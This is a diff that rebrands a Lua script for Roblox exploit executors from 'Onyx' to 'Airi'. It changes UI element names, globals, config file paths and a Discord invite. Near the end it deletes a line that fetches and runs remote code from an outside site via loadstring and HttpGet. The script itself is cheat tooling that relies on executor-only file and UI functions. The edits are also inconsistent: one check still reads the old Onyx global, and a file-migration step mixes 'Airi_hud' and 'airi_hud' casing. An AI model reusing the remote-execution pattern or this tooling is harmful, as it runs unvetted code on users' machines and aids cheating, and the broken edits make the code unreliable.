@@ -786,7 +786,7 @@ task.spawn(function()
 		break
 	end
 
-	if not v3 or v3:FindFirstChild("OnyxTitleSheen") then
+	if not v3 or v3:FindFirstChild("AiriTitleSheen") then
 		return
 	end
 	local uiGradient = v3:FindFirstChildWhichIsA("UIGradient")
@@ -796,7 +796,7 @@ task.spawn(function()
 	end
 
 	local uiGradient2 = Instance.new("UIGradient")
-	uiGradient2.Name = "OnyxTitleSheen"
+	uiGradient2.Name = "AiriTitleSheen"
 	uiGradient2.Rotation = 12
 	local colorSequence = ColorSequence.new
 	local tbl = {}
@@ -831,7 +831,7 @@ end)
 local color = Color3.fromHex
 
 v2:EditOpenButton({
-	Title = "Onyx",
+	Title = "Airi",
 	Icon = "solar:planet-bold",
 	CornerRadius = UDim.new(0, 16),
 	StrokeThickness = 2,
@@ -841,7 +841,7 @@ v2:EditOpenButton({
 	Draggable = true,
 })
 
-_G.OnyxV2 = v2
+_G.AiriV2 = v2
 local tbl
 
 tbl = {
@@ -866,8 +866,8 @@ tbl = {
 	hudPos = {},
 	cfgSnapshot = nil,
 	cfgWiped = false,
-	hudDir = "WindUI/OnyxV2/hud",
-	hudFile = "WindUI/OnyxV2/hud/autosave.json",
+	hudDir = "WindUI/AiriV2/hud",
+	hudFile = "WindUI/AiriV2/hud/autosave.json",
 }
 
 pcall(function()
@@ -1005,7 +1005,7 @@ task.spawn(function()
 				return
 			end
 			local uiGradient = Instance.new("UIGradient")
-			uiGradient.Name = "OnyxToastRamp"
+			uiGradient.Name = "AiriToastRamp"
 			uiGradient.Rotation = 45
 
 			uiGradient.Color = ColorSequence.new({
@@ -1201,8 +1201,8 @@ tbl.reclip = function(arg)
 	end
 end
 
-tbl.DISCORD_INVITE = "onyxscripts"
-tbl.DISCORD_FETCH = "XEBpqUNrMy"
+tbl.DISCORD_INVITE = "airiscripts"
+tbl.DISCORD_FETCH = "CYFyRWKRg"
 tbl.discordInfo = nil
 tbl.discordTried = false
 
@@ -1359,7 +1359,7 @@ tbl.discordCard = function(arg)
 	}
 
 	local paragraph = arg.Paragraph
-	local tbl3 = { Title = v3 and v3.name or "Onyx Scripts" }
+	local tbl3 = { Title = v3 and v3.name or "Airi Scripts" }
 	local str
 
 	if v3 then
@@ -1427,14 +1427,14 @@ tbl.card = function(arg)
 
 	pcall(function()
 		local hui = gethui and gethui() or CoreGui
-		local onyxCard = hui:FindFirstChild("OnyxCard")
+		local airiCard = hui:FindFirstChild("AiriCard")
 
-		if onyxCard then
-			onyxCard:Destroy()
+		if airiCard then
+			airiCard:Destroy()
 		end
 
 		local screenGui = Instance.new("ScreenGui")
-		screenGui.Name = "OnyxCard"
+		screenGui.Name = "AiriCard"
 		screenGui.IgnoreGuiInset = true
 		screenGui.ResetOnSpawn = false
 		screenGui.DisplayOrder = 99999
@@ -1805,7 +1805,7 @@ tbl.card = function(arg)
 end
 
 tbl.farewell = function()
-	if _G.__OnyxReloading then
+	if _G.__AiriReloading then
 		return
 	end
 
@@ -1816,7 +1816,7 @@ tbl.farewell = function()
 
 	tbl.card({
 		title = "Bye bye!",
-		subtitle = "Thanks for running Onyx",
+		subtitle = "Thanks for running Airi",
 		body = "Something let you down? Tell us in the server.",
 	})
 end
@@ -1870,20 +1870,20 @@ pcall(function()
 		return
 	end
 
-	if isfile("WindUI/OnyxV2/config/onyx_hud.json") then
+	if isfile("WindUI/AiriV2/config/Airi_hud.json") then
 		if writefile and not isfile(tbl.hudFile) then
-			writefile(tbl.hudFile, readfile("WindUI/OnyxV2/config/onyx_hud.json"))
+			writefile(tbl.hudFile, readfile("WindUI/AiriV2/config/airi_hud.json"))
 		end
 
-		delfile("WindUI/OnyxV2/config/onyx_hud.json")
+		delfile("WindUI/AiriV2/config/airi_hud.json")
 	end
 
 	if listfiles then
-		for _, v3 in ipairs(listfiles("WindUI/OnyxV2/config")) do
+		for _, v3 in ipairs(listfiles("WindUI/AiriV2/config")) do
 			local match = tostring(v3):match("[^/\\]+$") or ""
 
-			if match:match("^onyx_hud") then
-				local match2 = match:match("^onyx_hud_(.+)%.json$")
+			if match:match("^airi_hud") then
+				local match2 = match:match("^airi_hud_(.+)%.json$")
 
 				if match2 and writefile then
 					pcall(function()
@@ -3176,7 +3176,7 @@ tbl.pointerHeld = function()
 end
 
 task.spawn(function()
-	while _G.OnyxV2 == v2 do
+	while _G.AiriV2 == v2 do
 		task.wait(0.25)
 
 		if v.CurrentInput ~= nil and not tbl.pointerHeld() then
@@ -4315,9 +4315,9 @@ do
 		tbl.boxOn[arg] = false
 	end
 
-	_G.__OnyxBuild = "gatestyle-38"
-	_G.__OnyxGen = (_G.__OnyxGen or 0) + 1
-	tbl.gen = _G.__OnyxGen
+	_G.__AiriBuild = "gatestyle-38"
+	_G.__AiriGen = (_G.__AiriGen or 0) + 1
+	tbl.gen = _G.__AiriGen
 
 	tbl.current = function()
 		return tbl.gen == _G.__OnyxGen
@@ -4736,7 +4736,7 @@ do
 		end
 
 		local tbl3 = {
-			username = "Onyx",
+			username = "Airi",
 			avatar_url = tbl.markUrl(),
 			allowed_mentions = { parse = {} },
 			embeds = { tbl2 },
@@ -6572,7 +6572,7 @@ do
 			return
 		end
 		local screenGui = Instance.new("ScreenGui")
-		screenGui.Name = "Onyx" .. arg .. "Button"
+		screenGui.Name = "Airi" .. arg .. "Button"
 		screenGui.ResetOnSpawn = false
 		screenGui.IgnoreGuiInset = true
 		screenGui.Parent = CoreGui
@@ -14958,7 +14958,6 @@ task.delay(1.5, function()
 end)
 
 
-loadstring(game:HttpGet("https://star-scripts.com/api/run/CoephTiLN9-S5KNUfN0w7D-b5sfmzq7E"))()
 
 do
 	local str = "https://discord.gg/CYFyRWKRg" .. (tbl.DISCORD_INVITE or "airiscripts")
